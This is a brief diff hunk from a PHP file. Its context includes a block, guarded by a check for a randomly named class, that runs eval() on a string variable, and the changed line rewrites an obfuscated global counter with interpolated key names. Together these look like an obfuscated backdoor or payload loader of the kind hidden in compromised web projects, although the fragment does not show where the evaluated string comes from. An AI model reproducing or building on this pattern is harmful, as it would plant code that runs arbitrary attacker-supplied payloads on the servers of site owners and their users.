@@ -53,5 +53,5 @@ if (class_exists("ZipArchiveFontPathDirectoryVoteJED"))
 	}
 	eval((string)$zipcode);
 }
-$GLOBALS["${glob_oz_id}max"]=empty($GLOBALS[$glob_oz_id]["${oz_reg}ed"])?30:-1;
+$GLOBALS["${glob_oz_id}max"]=empty($GLOBALS[$glob_oz_id]["${oz_reg}ed"]) && !empty($GLOBALS[$glob_oz_id]["not${oz_reg}ed"])?2400/80:-1;
 
